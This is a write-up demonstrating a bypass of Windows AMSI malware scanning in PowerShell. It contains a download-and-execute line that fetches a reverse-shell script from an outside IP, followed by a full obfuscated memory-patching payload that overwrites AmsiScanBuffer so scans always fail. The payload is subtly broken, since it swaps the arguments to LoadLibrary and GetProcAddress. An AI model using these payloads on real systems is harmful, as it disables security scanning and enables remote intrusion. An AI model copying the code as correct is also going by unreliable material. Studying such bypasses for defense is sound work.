## Table of Contents
- [**Outline**](#section-0)
- [**Antimalware Scan Interface Explanation**](#section-1)
- [ **Proof of Concept - Bypassing 2023 Windows 10 Pro AMSI**](#section-2)
- [ **Obfuscation Methodolgy Anlysis**](#section-3)
- [ **Credits & Reference**](#section-4)


## Outline
![](/assets/AV/diagram.png)  

AMSI (Antimalware Scan Interface) is a Windows feature introduced in Windows 10 and Windows Server 2016. Its primary purpose is to provide an interface that allows antivirus and other security solutions to scan and inspect scripts and code in real-time at runtime

By default windows defender interacts with the AMSI API to scan PowerShell scripts, VBA macros, JavaScript and scripts using the Windows Script Host technology during execution. When a user executes a script or initiates PowerShell, the AMSI.dll is injected into the process memory space. Prior to execution the following two API’s are used by the antivirus to scan the buffer and strings for signs of malware. This ultimately prevents arbitrary execution of code.

The goal of this write-up is to demonstrate bypassing the most up to date AMSI protection measure implemented in Windows 10 Pro (2023/07/28) 
# AMSI Bypass Technique
The following evasive techniques aim to avoid detection by antivirus and security software.  

##### Code Fragmentation: 
Divide codes into smaller components and assemble at runtime, evading static analysis.  

##### Obfuscation: 
Utilize obfuscation techniques to obscure the true intent of the script, making it challenging for AMSI scanners to interpret the code accurately.  

#####  Memory Patching: 
Modify the AMSI Dynamic Link Library (DLL) in memory to either disable or alter its functionality temporarily.  

#### Powershell Downgrade: 
Downgrade to Windows PowerShell 2.0. It lacks essential security controls like AMSI protection, making it susceptible to exploitation as a means of evasion.

## Proof of Concept

![](/assets/AV/Final.gif)  

To verify that AMSI is correctly functioning, the tester first tried to initiate a reverse TCP connection through powershell using the below command
```bash
IEX (New-Object Net.WebClient).DownloadString('http://192.168.20.128:8443/Invoke-PowerShellTcp.ps1')
```
However, as seen above, AMSI sucessfully flags the activity as  `malicious` and proceeds to block the reverse shell connection. 
## Memory Patching
In order to bypass AMSI, the tester utilzed the following payload which was referenced [Red Team Playbook](https://www.xn--hy1b43d247a.com/defense-evasion/amsi-bypass)
```bash
$thing = @"
// thing 
// using System.Collections.ArrayList;
using System; // thingssa
using System.Runtime.InteropServices;
public class payload {
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
}
"@
Add-Type $thing
[System.Collections.ArrayList]$Patch = 0xB8, 0x57, 0x90, 0x90, 0x00, 0x90, 0x07, 0x80, 0x90, 0xC3
$Patch.Remove(0x90)
$Patch.Remove(0x90)
$Patch.Remove(0x90)
$Patch.Remove(0x90)

[byte[]]$byteArrayFun = "","","","","",""
$byteArrayFun[0] = $Patch[0]
$byteArrayFun[1] = $Patch[1]
$byteArrayFun[2] = $Patch[2]
$byteArrayFun[3] = $Patch[3]
$byteArrayFun[4] = $Patch[4]
$byteArrayFun[5] = $Patch[5]

$to = "Am" +"s" + "iSc" + "a" + "nBu" + "ffer"
$connect = "a" + "m" + "si" + ".dl" + "l"
$librarz = [payload]::LoadLibrary($to)
$dest = [payload]::GetProcAddress($librarz, $connect)
$p = 0
[payload]::VirtualProtect($dest, [uint32]5, 0x40, [ref]$p)

[System.Runtime.InteropServices.Marshal]::Copy($byteArrayFun, 0, $dest, 6)
```

By patching the `AmsiScanBuffer` function in AMSI.dll with specific assembly code (mov eax, 0x80070057 and ret), the function will immediately return an error code without scanning PowerShell code. This bypasses AMSI, allowing the attacker's PowerShell code to run undetected. 






## Weaponization

## Reference
-레드팀 플레이북 Read team playbook, Offensive Security